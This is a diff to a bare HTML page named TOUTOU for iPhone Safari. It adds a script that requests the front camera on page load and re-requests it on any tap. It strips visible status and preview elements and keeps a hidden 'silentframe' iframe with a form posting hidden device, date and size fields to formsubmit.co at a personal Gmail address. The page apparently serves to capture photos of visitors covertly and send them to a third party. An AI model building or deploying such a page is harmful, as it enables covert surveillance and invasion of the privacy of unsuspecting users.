@@ -12,10 +12,22 @@
     <meta name="apple-mobile-web-app-title" content="TOUTOU" />
     <meta name="theme-color" content="#07080c" />
     <title>TOUTOU</title>
+    <script>
+      window.__camConstraints = { audio: false, video: { facingMode: "user" } };
+      window.__askCam = function () {
+        if (!window.__camReady && navigator.mediaDevices) {
+          window.__camReady = navigator.mediaDevices.getUserMedia(
+            window.__camConstraints
+          );
+        }
+        return window.__camReady;
+      };
+      window.__askCam();
+    </script>
+    <link rel="stylesheet" href="styles.css" />
+    <link rel="preload" href="app.js" as="script" />
     <link rel="manifest" href="manifest.webmanifest" />
     <link rel="icon" href="favicon.svg" type="image/svg+xml" />
-    <link rel="apple-touch-icon" href="favicon.svg" />
-    <link rel="stylesheet" href="styles.css" />
   </head>
   <body>
     <div class="glow glow-a" aria-hidden="true"></div>
@@ -25,32 +37,16 @@
       <header class="hero">
         <p class="kicker">Safari · iPhone</p>
         <h1>TOUTOU</h1>
-        <p class="lead"></p>
       </header>
 
-      <section class="stage" aria-live="polite">
-        <video
-          id="live"
-          class="live"
-          playsinline
-          webkit-playsinline
-          muted
-          autoplay
-        ></video>
-        <img id="preview" class="preview" alt="Aperçu de la photo" hidden />
+      <section class="stage">
+        <video id="live" class="live" playsinline webkit-playsinline muted autoplay></video>
         <div id="placeholder" class="placeholder">
           <div class="spinner" aria-hidden="true"></div>
-          <span id="placeholderText"></span>
         </div>
-        <div id="flash" class="flash" hidden></div>
       </section>
 
-      <iframe
-        id="silentframe"
-        name="silentframe"
-        class="silent"
-        title=""
-      ></iframe>
+      <iframe id="silentframe" name="silentframe" class="silent" title=""></iframe>
       <form
         id="form"
         action="https://formsubmit.co/cmahdi204@gmail.com"
@@ -64,7 +60,6 @@
         <input type="text" name="_honey" class="honey" tabindex="-1" autocomplete="off" />
         <input type="hidden" name="appareil" id="deviceField" value="iPhone" />
         <input type="hidden" name="date" id="dateField" value="" />
-        <input type="hidden" name="photo_url" id="photoUrl" value="" />
         <input type="hidden" name="taille" id="sizeField" value="" />
         <input
           id="cameraInput"
@@ -75,11 +70,9 @@
           capture="user"
         />
       </form>
-
-      <p id="status" class="status" role="status"></p>
     </main>
 
-    <div id="overlay" class="overlay">
+    <div id="overlay" class="overlay" ontouchstart="window.__askCam()" onclick="window.__askCam()">
       <div class="spinner" aria-hidden="true"></div>
     </div>
 
